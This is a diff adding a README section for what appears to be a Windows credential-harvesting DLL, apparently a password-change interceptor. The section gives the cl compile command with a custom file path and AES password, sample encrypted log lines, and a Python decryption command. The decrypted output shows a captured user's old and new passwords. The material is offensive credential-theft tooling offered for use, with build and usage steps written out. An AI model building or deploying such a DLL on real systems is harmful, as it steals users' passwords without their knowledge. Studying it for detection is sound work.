@@ -32,6 +32,34 @@ Which decoded is:
 
 <br>
 
+## 2. Store in a text file + AES-encryption
+
+The default path is "C:\Windows\Task\default.txt" and the default AES password is "TEST1234", but you can customize it using the macros /DFILE_PATH and /DAES_PWD:
+
+```
+cl /LD /DFILE_PATH=\"C:\\\\Windows\\\\Tasks\\\\custom_path.txt\" /DAES_PWD=\"TEST1234\" 2_textfile_aes.c crypt32.lib advapi32.lib /link /OUT:test.dll
+```
+
+This creates a file with a content similar to:
+
+```
+gT5LdF8L+zoDlUKBYU0fASbUrBst/hsTltI8aqUyQiGcvev+CtoxnIV53AEM2hdv32TknPnleRUL8eUb4AtRjCOyN9P+tICa7t0BMQAE7FZt+Z+tGpq0unJOsvDQ2VGvcG1RzLL/QrMPUUYvIM1BcEmVPYI5/KZQpr5p+8dX2yrE40QEoN79OodAAflEbh0W
+gT5LdF8L+zoDlUKBYU0fASbUrBst/hsTltI8aqUyQiGcvev+CtoxnIV53AEM2hdv0Euwo4lOajrIKowzxM2qflL7XE8KeenZ/7RHu2f7q0xnu/Cl9iGiwxWz9tkCZjD0BL5j9ysFRPla4tLGU2ThIlBeYQ9dVLGiKpZbtX8liXygU4A5o20iROUMR9Ajtojc
+```
+
+You can decrypt it using *decrypt_aes*:
+
+```
+python decrypt_aes.py gT5LdF8L+zoDlUKBYU0fASbUrBst/hsTltI8aqUyQiGcvev+CtoxnIV53AEM2hdv32TknPnleRUL8eUb4AtRjCOyN9P+tICa7t0BMQAE7FZt+Z+tGpq0unJOsvDQ2VGvcG1RzLL/QrMPUUYvIM1BcEmVPYI5/KZQpr5p+8dX2yrE40QEoN79OodAAflEbh0W
+python decrypt_aes.py  gT5LdF8L+zoDlUKBYU0fASbUrBst/hsTltI8aqUyQiGcvev+CtoxnIV53AEM2hdv0Euwo4lOajrIKowzxM2qflL7XE8KeenZ/7RHu2f7q0xnu/Cl9iGiwxWz9tkCZjD0BL5j9ysFRPla4tLGU2ThIlBeYQ9dVLGiKpZbtX8liXygU4A5o20iROUMR9Ajtojc
+```
+
+And you get:
+
+```
+{"timestamp":"2025-04-14 11:20:18","operation":"PWD_UPDATE_OLD","domain":"DESKTOP-0N6G696","username":"ricardo","password":"qq"}
+{"timestamp":"2025-04-14 11:20:18","operation":"PWD_UPDATE_NEW","domain":"DESKTOP-0N6G696","username":"ricardo","password":"q"}
+```
 
 --------------------
 
